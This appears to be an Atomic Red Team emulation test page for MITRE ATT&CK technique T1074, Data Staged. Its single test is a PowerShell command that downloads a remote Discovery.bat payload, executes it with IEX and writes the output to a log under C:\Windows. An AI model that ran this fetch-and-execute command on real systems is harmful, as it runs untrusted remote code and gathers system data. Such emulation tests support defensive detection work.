# Data Staged

MITRE ATT&CK Technique: [T1074](https://attack.mitre.org/wiki/Technique/T1074)

### Stage data from Discovery.bat

Input:

    powershell.exe "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/Windows/Payloads/Discovery.bat')" > c:\windows\pi.log
